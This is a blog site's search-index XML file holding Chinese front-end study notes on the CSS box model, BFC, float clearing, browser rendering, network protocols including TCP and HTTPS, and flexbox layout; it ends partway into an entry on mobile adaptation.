<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>整理-盒子模型</title>
      <link href="2020/11/26/%E6%95%B4%E7%90%86-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"/>
      <url>2020/11/26/%E6%95%B4%E7%90%86-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>盒子模型</li><li>脱离文档流</li><li>BFC</li><li>清除浮动</li></ul><a id="more"></a><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><ul><li>w3c标准盒模型<ul><li>包括 width, height, margin, padding, border</li><li>可视宽度是 width + padding + border</li><li>box-sizing: content-box;</li></ul></li><li>ie盒模型<ul><li>也包括 width, height, margin, padding, border</li><li>可视宽度 width</li><li>box-sizing: border-box;</li></ul></li></ul><h2 id="脱离文档流"><a href="#脱离文档流" class="headerlink" title="脱离文档流"></a>脱离文档流</h2><ul><li>所谓的<strong>文档流</strong>，指的是元素排版布局过程中，元素会自动从左往右，从上往下的流式排列。</li><li><strong>脱离文档流</strong>，也就是将元素从普通的布局排版中拿走，其他盒子在定位的时候，会当做脱离文档流的元素不存在而进行定位。</li><li><strong>浮动 ( float ) 和绝对定位 ( position:absolute )</strong><ul><li>均脱离文档流</li><li>均不占位</li><li>浮动情况下，其他元素会自动在其右边排列。绝对定位会完全忽视其存在。</li></ul></li></ul><h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><ul><li>BFC的定义:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BFC（Block formatting context ）“块级格式上下文”。 是用于布局块级盒子的一块渲染区域。并且与这个区域的外部毫无关系。</span><br></pre></td></tr></table></figure><ul><li>BFC的布局规则</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">内部的Box会在垂直方向，一个接一个地放置。</span><br><span class="line"></span><br><span class="line">Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。</span><br><span class="line"></span><br><span class="line">每个盒子（块盒与行盒）的margin box的左边，与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</span><br><span class="line"></span><br><span class="line">BFC的区域不会与float box重叠。</span><br><span class="line"></span><br><span class="line">BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</span><br><span class="line"></span><br><span class="line">计算BFC的高度时，浮动元素也参与计算。</span><br></pre></td></tr></table></figure><ul><li>触发BFC的条件:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">满足下列条件之一就可以触发BFC</span><br><span class="line"></span><br><span class="line"> 1：根元素，即html元素</span><br><span class="line"></span><br><span class="line"> 2：float的值不为none</span><br><span class="line"></span><br><span class="line"> 3：overflow的值不为visible</span><br><span class="line"></span><br><span class="line"> 4：display的值为inline-block、table-cell、table-caption</span><br><span class="line"></span><br><span class="line"> 5：position的值为absolute或者fixed</span><br></pre></td></tr></table></figure><ul><li>BFC的作用</li></ul><p>（1）<strong>可以阻止元素被浮动的元素覆盖</strong>（可做两栏布局自适应）</p><p><a href="https://img-blog.csdnimg.cn/20190428161126130.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428161126130.png" alt="1"></a></p><p> 触发红色盒子的BFC后</p><p><a href="https://img-blog.csdnimg.cn/20190428161306268.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428161306268.png" alt="2"></a></p><p>（2）<strong>解决高度塌陷</strong>：我们知道当浮动的盒子的父元素没有高度时，会出现高度塌陷现象。</p><p><a href="https://img-blog.csdnimg.cn/20190428162141491.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428162141491.png" alt="3"></a></p><p> 父盒子触发BFC可以解决这个问题,根据布局规则的最后一条。</p><p>（3）<strong>解决同一个BFC区域的垂直方向margin塌陷的问题</strong></p><p><a href="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" alt="4"></a></p><p> 分为两个不同的BFC之后可以解决</p><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><ul><li>给父盒子添加高度</li><li>在浮动元素后使用一个空元素如<code>&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;</code>，并在CSS中赋予<code>.clear{clear:both;}</code>属性即可清理浮动。</li><li>父盒子设置<code>overflew</code>不为<code>visible</code>，触发父盒子的<code>BFC</code>，浮动元素也参与高度计算</li><li>:after伪元素，给浮动元素的容器添加一个clearfix的class，然后给这个class添加一个:after伪元素实现元素末尾添加一个看不见的块元素清理浮动。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">"020"</span>; <span class="comment">/*content设置成一个看不见的空格*/</span></span><br><span class="line">  <span class="attribute">display</span>: block; </span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">clear</span>: both; </span><br><span class="line">  <span class="attribute">visibility</span>: hidden;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的例子，我们不难发现清除浮动的方法可以分成两类：</p><ol><li><p>利用 clear 属性，包括在浮动元素末尾添加一个带有 clear: both 属性的空 div 来闭合元素，其实利用 :after 伪元素的方法也是在元素末尾添加一个内容为一个点并带有 clear: both 属性的元素实现的。</p></li><li><p>触发浮动元素父元素的 BFC (Block Formatting Contexts, 块级格式化上下文)，使到该父元素可以包含浮动元素，关于这一点。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-浏览器渲染相关</title>
      <link href="2020/11/23/%E6%95%B4%E7%90%86-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/"/>
      <url>2020/11/23/%E6%95%B4%E7%90%86-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>浏览器多进程架构</li><li>浏览器渲染过程</li><li>渲染进程的三个线程</li><li>js 会阻塞 dom 解析</li><li>css 不会阻塞 dom 解析 </li></ul><a id="more"></a><h2 id="浏览器多进程架构"><a href="#浏览器多进程架构" class="headerlink" title="浏览器多进程架构"></a>浏览器多进程架构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Browers进程，一个只有一个</span><br><span class="line">渲染进程，一个tab窗口对应一个</span><br><span class="line">GPU进程，只有一个，负责GPU渲染</span><br><span class="line">插件进程，每个插件会创建一个进程</span><br><span class="line"></span><br><span class="line">// 浏览器中右上角更多工具 =&gt; 任务管理器</span><br></pre></td></tr></table></figure><h2 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h2><blockquote><p>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</p></blockquote><ul><li>DOM Tree：浏览器将HTML解析成树形的数据结构。</li><li>CSS Rule Tree：浏览器将CSS解析成树形的数据结构。</li><li>Render Tree: DOM和CSS合并后生成Render Tree。</li><li>layout: 有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系，从而去计算出每个节点在屏幕中的位置</li><li>painting: 按照算出来的规则，通过显卡，把内容画到屏幕上。</li><li>reflow（回流）：当浏览器发现某个部分发生了点变化影响了布局，需要倒回去重新渲染，内行称这个回退的过程叫 reflow。reflow 会从 html 这个 root frame 开始递归往下，依次计算所有的结点几何尺寸和位置。reflow 几乎是无法避免的。现在界面上流行的一些效果，比如树状目录的折叠、展开（实质上是元素的显示与隐藏）等，都将引起浏览器的 reflow。鼠标滑过、点击……只要这些行为引起了页面上某些元素的占位面积、定位方式、边距等属性的变化，都会引起它内部、周围甚至整个页面的重新渲 染。通常我们都无法预估浏览器到底会 reflow 哪一部分的代码，它们都彼此相互影响着。</li><li>repaint（重绘）：改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性时，屏幕的一部分要重画，但是元素的几何尺寸没有变。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)display:none 的节点不会被加入Render Tree，而visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为display:none是更优的。</span><br><span class="line"></span><br><span class="line">(2)display:none 会触发 reflow，而 visibility:hidden 只会触发 repaint，因为没有发现位置变化。</span><br><span class="line"></span><br><span class="line">(3)有些情况下，比如修改了元素的样式，浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow。但是在有些情况下，比如resize 窗口，改变了页面默认的字体等。对于这些操作，浏览器会马上进行 reflow。</span><br></pre></td></tr></table></figure><p><img src="https://images2018.cnblogs.com/blog/1028513/201805/1028513-20180530154313816-1498972038.png" alt="1"></p><h2 id="渲染进程的三个线程"><a href="#渲染进程的三个线程" class="headerlink" title="渲染进程的三个线程"></a>渲染进程的三个线程</h2><p><img src="https://oscimg.oschina.net/oscnet/418cfcf9122d7eb129c92bda22a008d26c8.png" alt="2"></p><ul><li><p>Compositor Thread</p><p>这个线程既负责接收浏览器传来的垂直同步信号(Vsync，水平同步表示画出一行屏幕线，垂直同步就表示从屏幕顶部到底部的绘制已经完成，指示着前一帧的结束，和新一帧的开始)， 也负责接收OS传来的用户交互，比如滚动、输入、点击、鼠标移动等等。<br>如果可能，Compositor Thread会直接负责处理这些输入，然后转换为对layer的位移和处理，并将新的帧直接commit到GPU Thread，从而直接输出新的页面。否则，比如你在滚动、输入事件等等上注册了回调，又或者当前页面中有动画等情况，那么这个时候Compositor Thread便会唤醒Main Thread，让后者去执行JS、完成重绘、重排等过程，产出新的纹理，然后Compositor Thread再进行相关纹理的commit至GPU Thread，完成输出。</p></li><li><p>Main Thread</p><p><img src="https://oscimg.oschina.net/oscnet/38642585793dd3eeb282143e587ec9e8b37.png" alt="img"></p><p>这里大家就很熟悉了，chrome devtools的Timeline里Main那一栏显示的内容就是Main Thread完成的相关任务：某段JS的执行、Recalculate Style、Update Layer Tree、Paint、Composite Layers等等。 </p></li><li><p>Compositor Tile Worker(s)<br>可能有一个或多个线程，比如PC端的chrome是2个或4个，安卓和safari为1个或2个不等。是由Compositor Thread创建的，专门用来处理tile的Rasterization（前文说过的光栅化）。</p></li></ul><p>可以看到Compositor Thread是一个很核心的东西，后面的俩线程都是由他主要进行控制的。<br>同时，用户输入是直接进入Compositor Thread的，一方面在那些不需要执行JS或者没有CSS动画、不重绘等的场景时，可以直接对用户输入进行处理和响应，而Main Thread是有很复杂的任务流程的。这使得浏览器可以快速响应用户的滚动、打字等等输入，完全不用进主线程。<strong>就比如说js动画要走主线程，css动画有的不会走主线程，直接在 Compositor Thread 中完成</strong></p><blockquote><p>所以说 css 动画会不会被 js 阻塞呢，答案是有时会有时不会，比如 transform</p></blockquote><h2 id="js-会阻塞-dom"><a href="#js-会阻塞-dom" class="headerlink" title="js 会阻塞 dom"></a>js 会阻塞 dom</h2><ul><li>现代浏览器会并行加载js文件，但是按照书写顺序执行代码</li><li>加载或者执行js时会阻塞对标签的解析，也就是阻塞了dom树的形成，只有等到js执行完毕，浏览器才会继续解析标签。没有dom树，浏览器就无法渲染，所以当加载很大的js文件时，可以看到页面很长时间是一片空白</li><li>之所以会阻塞对标签的解析是因为加载的js中可能会创建，删除节点等，这些操作会对dom树产生影响，如果不阻塞，等浏览器解析完标签生成dom树后，js修改了某些节点，那么浏览器又得重新解析，然后生成dom树，性能比较差</li></ul><h2 id="css-不会阻塞-dom-解析但会阻塞渲染"><a href="#css-不会阻塞-dom-解析但会阻塞渲染" class="headerlink" title="css 不会阻塞 dom 解析但会阻塞渲染"></a>css 不会阻塞 dom 解析但会阻塞渲染</h2><ul><li>因为需要具有 DOM 以及 CSSOM 才会构建渲染树，加载 css 的时候肯定无法继续渲染</li></ul><blockquote><p>为什么把 js 放在底部，css 放在顶部</p></blockquote><p>Js 放在顶部会阻塞 dom 的渲染，浏览器可能一直转圈圈，而 css 不会阻塞 dom 解析。</p><p>我们会将 js 放在后面，以减少First Paint的时间</p>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-网络协议相关</title>
      <link href="2020/11/23/%E6%95%B4%E7%90%86-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3/"/>
      <url>2020/11/23/%E6%95%B4%E7%90%86-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>osi七层模型与tcp/ip五层模型</li><li>TCP与UDP的区别</li><li>TCP三次握手，四次挥手</li><li>什么是HTTP协议</li><li>长连接与多路复用</li><li>HTTPS</li></ul><a id="more"></a><h2 id="osi七层模型与tcp-ip五层模型"><a href="#osi七层模型与tcp-ip五层模型" class="headerlink" title="osi七层模型与tcp/ip五层模型"></a>osi七层模型与tcp/ip五层模型</h2><p><strong>OSI定义了网络互连的七层框架</strong></p><ul><li>应用层：针对你特定应用的协议</li><li>表示层：设备固定的数据格式和网络标准数据格式之间的转化</li><li>会话层：通信管理，负责建立和单开通信连接，管理传输层 以下分层</li><li>传输层：管理两个节点之间的数据传递。负责可靠传输</li><li>网络层：地址管理和路由选择</li><li>数据链路层：互联设备之间传送和识别数据帧</li><li>物理层：界定连接器和网线之间的规格</li></ul><p><strong>TCP/IP四（五）层模型</strong></p><p>每一层都呼叫它的下一层提供的网络来完成自己的需求。（如果是四层模型数据链路层和物理层在一层）</p><ul><li>物理层：负责光电信号传递方式。集线器工作在物理层。以太网协议。</li><li>数据链路层：负责设备之间的数据帧的传输和识别。交换机工作在数据链路层。例如网卡设备的驱动，帧同步，冲突检测，数据差错校验等工作。</li><li>网络层：负责地址管理和路由选择。路由器工作在网络层。</li><li>传输层：负责两台主机之间的数据传输。</li><li>应用层：负责应用程序之间的沟通。网络编程主要针对的就是应用层。</li></ul><h2 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h2><ul><li><p>tcp 和 udp 都是属于传输层，传输层提供应用程序间的通信，其功能包括格式化信息流，提供可靠传输。</p></li><li><p>TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接</p></li><li><p>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付。</p></li><li><p>Tcp通过校验和，重传控制，序号标识，滑动窗口、确认应答实现可靠传输。如丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。</p></li><li><p>UDP具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。</p></li></ul><p><strong>为什么UDP有时比TCP更有优势?</strong></p><ul><li><p>UDP以其简单、传输快的优势，在越来越多场景下取代了TCP,如实时游戏。</p></li><li><p>网速的提升给UDP的稳定性提供可靠网络保障，丢包率很低，如果使用应用层重传，能够确保传输的可靠性。</p></li><li><p>TCP为了实现网络通信的可靠性，使用了复杂的拥塞控制算法，建立了繁琐的握手过程，由于TCP内置的系统协议栈中，极难对其进行改进。</p></li><li><p>采用TCP，一旦发生丢包，TCP会将后续的包缓存起来，等前面的包重传并接收到后再继续发送，延时会越来越大，基于UDP对实时性要求较为严格的情况下，采用自定义重传机制，能够把丢包产生的延迟降到最低，尽量减少网络问题对游戏性造成影响</p></li></ul><h2 id="TCP三次握手，四次挥手"><a href="#TCP三次握手，四次挥手" class="headerlink" title="TCP三次握手，四次挥手"></a>TCP三次握手，四次挥手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">三次握手：通俗的讲</span><br><span class="line">                客户端：HI听见了吗,</span><br><span class="line">                服务器端：HI我听见了，</span><br><span class="line">                客户端：我也听见你了。     接下来开始愉快地聊天</span><br><span class="line">四次握手：通俗的讲</span><br><span class="line">                客户端：我们分手把，</span><br><span class="line">                服务端：好的，你等我把数据给你传输完</span><br><span class="line">                服务端：我传输完了，</span><br><span class="line">                客户端：好了，可以分手了。 接下来就真正的分手了</span><br></pre></td></tr></table></figure><ul><li><a href="https://img-blog.csdn.net/20180717202520531?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" target="_blank" rel="noopener">三次握手</a></li><li><a href="https://img-blog.csdn.net/20180717204202563?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" target="_blank" rel="noopener">四次挥手</a></li><li>SYN (synchronous建立联机) </li><li>ACK (acknowledgement 确认) </li><li>FIN (finish结束) </li><li>Sequence number (顺序号码) </li><li>为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了保证A发送的最后一个ACK报文能够到达B。这个ACK报文段有可能丢失，因而使处在LAST-ACK状态的B收不到对已发送的FIN+ACK报文段的确认。B会超时重传这个FIN+ACK报文段，而A就能在2MSL时间内收到这个重传的FIN+ACK报文段。</span><br></pre></td></tr></table></figure><h2 id="什么是-HTTP-协议"><a href="#什么是-HTTP-协议" class="headerlink" title="什么是 HTTP 协议"></a>什么是 HTTP 协议</h2><blockquote><p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。</p></blockquote><table><thead><tr><th>版本</th><th>产生时间</th><th>内容</th><th>发展现状</th></tr></thead><tbody><tr><td>HTTP/0.9</td><td>1991年</td><td>不涉及数据包传输，规定客户端和服务器之间通信格式，只能GET请求</td><td>没有作为正式的标准</td></tr><tr><td>HTTP/1.0</td><td>1996年</td><td>传输内容格式不限制，增加PUT、PATCH、HEAD、 OPTIONS、DELETE命令</td><td>正式作为标准</td></tr><tr><td>HTTP/1.1</td><td>1997年</td><td>持久连接(长连接)、节约带宽、HOST域、管道机制、分块传输编码</td><td>2015年前使用最广泛</td></tr><tr><td>HTTP/2</td><td>2015年</td><td>多路复用、服务器推送、头信息压缩、二进制协议等</td><td>逐渐覆盖市场</td></tr></tbody></table><h2 id="长连接与多路复用"><a href="#长连接与多路复用" class="headerlink" title="长连接与多路复用"></a>长连接与多路复用</h2><ul><li>长连接：在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</li><li>多路复用：在 HTTP 1.0 中，发起一个请求是这样的：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">浏览器请求 url -&gt; 解析域名 -&gt; 建立 HTTP 连接 -&gt; 服务器处理文件 -&gt; 返回数据 -&gt; 浏览器解析、渲染文件 </span><br><span class="line"></span><br><span class="line">这个流程最大的问题是，每次请求都需要建立一次 HTTP 连接，也就是我们常说的3次握手4次挥手，这个过程在一次请求过程中占用了相当长的时间，而且逻辑上是非必需的，因为不间断的请求数据，第一次建立连接是正常的，以后就占用这个通道，下载其他文件，这样效率多高啊！</span><br><span class="line"></span><br><span class="line">为了解决这个问题， HTTP 1.1 中提供了 Keep-Alive，允许我们建立一次 HTTP 连接，来返回多次请求数据。</span><br><span class="line"></span><br><span class="line">但是这里有两个问题：</span><br><span class="line"></span><br><span class="line">HTTP 1.1 基于串行文件传输数据，因此这些请求必须是有序的，比如需要传输：hello world，只能从h到d一个一个的传输，不能并行传输，因为接收端并不知道这些字符的顺序。所以实际上我们只是节省了建立连接的时间，而获取数据的时间并没有减少</span><br><span class="line"></span><br><span class="line">最大并发数问题，假设我们在 Apache 中设置了最大并发数 300，而因为浏览器本身的限制，最大请求数为 6，那么服务器能承载的最高并发数是 50</span><br><span class="line"></span><br><span class="line">而 HTTP/2 引入二进制数据帧和流的概念，其中帧对数据进行顺序标识，这样浏览器收到数据之后，就可以按照序列对数据进行合并，而不会出现合并后数据错乱的情况。同样是因为有了序列，服务器就可以并行的传输数据。</span><br><span class="line"></span><br><span class="line">HTTP/2 对同一域名下所有请求都是基于流，也就是说同一域名不管访问多少文件，也只建立一路连接。同样Apache的最大连接数为300，因为有了这个新特性，最大的并发就可以提升到300，比原来提升了6倍。</span><br></pre></td></tr></table></figure><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTP请求都是明文传输的，所谓的明文指的是没有经过加密的信息，如果HTTP请求被黑客拦截，并且里面含有银行卡密码等敏感数据的话，会非常危险。为了解决这个问题，Netscape 公司制定了HTTPS协议，HTTPS可以将数据加密传输，也就是传输的是密文，即便黑客在传输过程中拦截到数据也无法破译，这就保证了网络通信的安全。</p><ul><li><p>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的，保证了通信的保密性。当然SSL协议并不能对UDP应用进行保护</p></li><li><p>虽然使用 HTTP 协议无法确定通信方，使用 SSL可以。SSL使用了一种被称为证书的手段，证书由值得信任的第三方机构颁发，使用HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。证书用以证明服务器和客户端是实际存在的。身份确认过程使用RSA非对称密钥加密方式（破解难度基于两个大素数乘积的因式分解难度），但是为了提高效率，身份确认完成后使用共商后的对称密钥。</p></li><li><p>SSL协议位于TCP/IP协议与各种应用层协议（不止能用于HTTP）之间，为数据通讯提供安全支持。</p><p>SSL协议可分为两层：</p><p>（1）SSL记录协议：建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。</p><p>（2）SSL握手协议：建立在记录协议之上，用于数据传输开始前的双方身份认证、协商加密算法、交换加密密钥等。</p></li><li><p>主要流程：</p><ul><li>客户端向服务器发起HTTPS请求，连接到服务器的443端口</li><li>服务器端有一个密钥对，即公钥和私钥，是用来进行非对称加密使用的，服务器端保存着私钥，不能将其泄露，公钥可以发送给任何人。</li><li>服务器将自己的公钥发送给客户端。</li><li>客户端收到服务器端的证书之后，会对证书进行检查，验证其合法性，如果发现发现证书有问题，那么HTTPS传输就无法继续。严格的说，这里应该是验证服务器发送的数字证书的合法性，关于客户端如何验证数字证书的合法性，下文会进行说明。如果公钥合格，那么客户端会生成一个随机值，这个随机值就是用于进行对称加密的密钥，我们将该密钥称之为client key，即客户端密钥，这样在概念上和服务器端的密钥容易进行区分。然后用服务器的公钥对客户端密钥进行非对称加密，这样客户端密钥就变成密文了，至此，HTTPS中的第一次HTTP请求结束。</li><li>客户端会发起HTTPS中的第二个HTTP请求，将加密之后的客户端密钥发送给服务器。</li><li>服务器接收到客户端发来的密文之后，会用自己的私钥对其进行非对称解密，解密之后的明文就是客户端密钥，然后用客户端密钥对数据进行对称加密，这样数据就变成了密文。</li><li>然后服务器将加密后的密文发送给客户端。</li><li>客户端收到服务器发送来的密文，用客户端密钥对其进行对称解密，得到服务器发送的数据。这样HTTPS中的第二个HTTP请求结束，整个HTTPS传输完成。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-flex</title>
      <link href="2020/11/22/%E6%95%B4%E7%90%86-flex/"/>
      <url>2020/11/22/%E6%95%B4%E7%90%86-flex/</url>
      
        <content type="html"><![CDATA[<ul><li>flex常见属性</li><li>flex-grow，flex-shrink，flex-basis</li><li>flex:1</li><li>space-evenly</li><li>flex布局实例</li></ul><a id="more"></a><hr><ul><li><p><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a></p></li><li><p><a href="https://blog.csdn.net/qq_40138556/article/details/103967529" target="_blank" rel="noopener">flex:1详解</a></p></li><li><a href="https://blog.csdn.net/u012260238/article/details/86656175" target="_blank" rel="noopener">重点看这篇文章</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flex-basis 规定的是子元素的基准值。所以是否溢出的计算与此属性息息相关。flex-basis 规定的范围取决于 box-sizing。这里主要讨论以下 flex-basis 的取值情况：</span><br><span class="line"></span><br><span class="line">auto：首先检索该子元素的主尺寸，如果主尺寸不为 auto，则使用值采取主尺寸之值；如果也是 auto，则使用值为 content。</span><br><span class="line"></span><br><span class="line">content：指根据该子元素的内容自动布局。(内容多的占比也会多)</span><br><span class="line"></span><br><span class="line">百分比：根据其包含块（即伸缩父容器）的主尺寸计算。如果包含块的主尺寸未定义（即父容器的主尺寸取决于子元素），则计算结果和设为 auto 一样。</span><br></pre></td></tr></table></figure><ul><li>space-evenly为项目之间间距与项目与容器间距相等，相当于除去项目宽度，平均分配了剩余宽度作为项目左右margin。</li></ul><h2 id="flex-布局实例"><a href="#flex-布局实例" class="headerlink" title="flex 布局实例"></a>flex 布局实例</h2><ul><li>场景：一行5个卡片，卡片数量不限，自动换行，从左到右排列，比如现在有9个卡片：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 如下效果</span><br><span class="line">1 1 1 1 1</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure><ul><li>每一行子元素的总基准值是：20% * n</li><li>flex-grow 和 flex-shrink 都是 0，不允许放大和缩小，除基准值之外的剩余空间不会被分配</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-flow</span>: row wrap;</span><br><span class="line">  <span class="attribute">justify-content</span>: start;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-移动端适配</title>
      <link href="2020/11/16/%E6%95%B4%E7%90%86-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/"/>
      <url>2020/11/16/%E6%95%B4%E7%90%86-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/</url>
      
